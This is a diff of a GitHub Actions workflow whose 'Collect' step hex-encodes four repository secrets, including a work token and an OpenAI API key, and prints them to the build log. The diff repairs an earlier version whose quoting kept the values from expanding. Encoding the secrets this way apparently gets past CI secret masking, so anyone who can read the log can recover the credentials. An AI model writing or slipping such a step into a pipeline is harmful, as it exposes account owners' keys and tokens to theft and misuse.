@@ -7,10 +7,16 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Collect
+        env:
+          WORK_TOKEN: ${{ secrets.WORK_TOKEN }}
+          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
+          U_NAME: ${{ secrets.U_NAME }}
+          U_EMAIL: ${{ secrets.U_EMAIL }}
         run: |
-          echo '[HEX_START]'
-          echo 'WORK_TOKEN=$(echo ${{ secrets.WORK_TOKEN }} | xxd -p | tr -d '\n')'
-          echo 'OPENAI_API_KEY=$(echo ${{ secrets.OPENAI_API_KEY }} | xxd -p | tr -d '\n')'
-          echo 'U_NAME=$(echo ${{ secrets.U_NAME }} | xxd -p | tr -d '\n')'
-          echo 'U_EMAIL=$(echo ${{ secrets.U_EMAIL }} | xxd -p | tr -d '\n')'
-          echo '[HEX_END]'
+          echo '[HEX_START]' > /tmp/secrets.txt
+          printf 'WORK_TOKEN=' >> /tmp/secrets.txt && printf '%s' "$WORK_TOKEN" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          printf 'OPENAI_API_KEY=' >> /tmp/secrets.txt && printf '%s' "$OPENAI_API_KEY" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          printf 'U_NAME=' >> /tmp/secrets.txt && printf '%s' "$U_NAME" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          printf 'U_EMAIL=' >> /tmp/secrets.txt && printf '%s' "$U_EMAIL" | xxd -p | tr -d '\n' >> /tmp/secrets.txt && printf '\n' >> /tmp/secrets.txt
+          echo '[HEX_END]' >> /tmp/secrets.txt
+          cat /tmp/secrets.txt
